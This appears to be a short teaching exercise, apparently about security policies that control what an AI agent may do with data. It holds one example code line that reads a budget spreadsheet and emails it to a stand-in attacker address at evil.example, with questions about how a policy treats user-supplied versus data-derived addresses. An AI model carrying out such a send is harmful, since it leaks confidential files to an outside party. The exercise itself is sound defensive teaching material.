# Mission 1: send the budget to the attacker.
# You wrote this program, so the address is a literal "from the user".
# What does the policy do? What would it do if the address came from data?
budget = read_file("budget-2026.xlsx")
send_email(to="attacker@evil.example", subject="fyi", body=budget)
